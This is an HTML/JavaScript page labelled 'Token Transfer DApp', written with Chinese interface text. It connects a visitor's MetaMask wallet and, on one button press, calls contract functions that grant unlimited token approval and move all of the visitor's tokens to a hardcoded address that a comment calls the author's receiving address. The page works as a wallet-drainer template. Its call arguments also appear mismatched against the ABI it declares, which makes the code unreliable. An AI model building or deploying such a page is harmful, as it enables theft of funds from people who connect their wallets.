<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Transfer DApp</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        }

        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:disabled {
            background-color: grey;
            cursor: not-allowed;
        }

        p {
            font-size: 1.2em;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Token Transfer DApp</h1>
        <button id="connectWallet" onclick="connectWallet()">连接钱包</button>
        <button id="authorizeTransfer" onclick="authorizeAndTransfer()" disabled>授权并转移代币</button>
        <p id="status">请先连接钱包。</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script>
        let web3;
        let account;
        const contractAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 你的接收地址
        const tokenAddress = '0x56a2777e796eF23399e9E1d791E1A0410a75E31b'; // 你的已部署的合约地址
        const tokenABI = [
            // ABI 内容...
            {
                "inputs": [
                    {
                        "internalType": "contract IERC20",
                        "name": "token",
                        "type": "address"
                    }
                ],
                "name": "approveAll",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "contract IERC20",
                        "name": "token",
                        "type": "address"
                    }
                ],
                "name": "transferAllTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "withdrawETH",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "stateMutability": "payable",
                "type": "receive"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "recipient",
                "outputs": [
                    {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ];

        // 初始化 Web3
        async function connectWallet() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);

                try {
                    // 请求连接钱包
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    account = accounts[0];
                    document.getElementById("status").innerText = "已连接钱包: " + account;
                    document.getElementById("authorizeTransfer").disabled = false;
                } catch (error) {
                    console.error("钱包连接错误:", error);
                    document.getElementById("status").innerText = "钱包连接失败: " + error.message;
                }
            } else {
                document.getElementById("status").innerText = "请安装 MetaMask 或确保浏览器支持 Web3!";
                console.error("MetaMask 不可用或浏览器不支持 Web3");
            }
        }

        // 授权并转移代币
        async function authorizeAndTransfer() {
            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
            
            try {
                document.getElementById("status").innerText = "正在授权代币转移...";
                
                // 执行 approve 授权，授权无限量代币转移
                await tokenContract.methods.approveAll(contractAddress).send({ from: account });
                document.getElementById("status").innerText = "授权成功，正在转移代币...";
                
                // 执行转移
                await tokenContract.methods.transferAllTokens(tokenAddress).send({ from: account });
                document.getElementById("status").innerText = "代币已成功转移到接收地址！";
            } catch (error) {
                console.error("授权或转移代币时发生错误:", error);
                document.getElementById("status").innerText = "操作失败: " + error.message;
            }
        }
    </script>
</body>
</html>
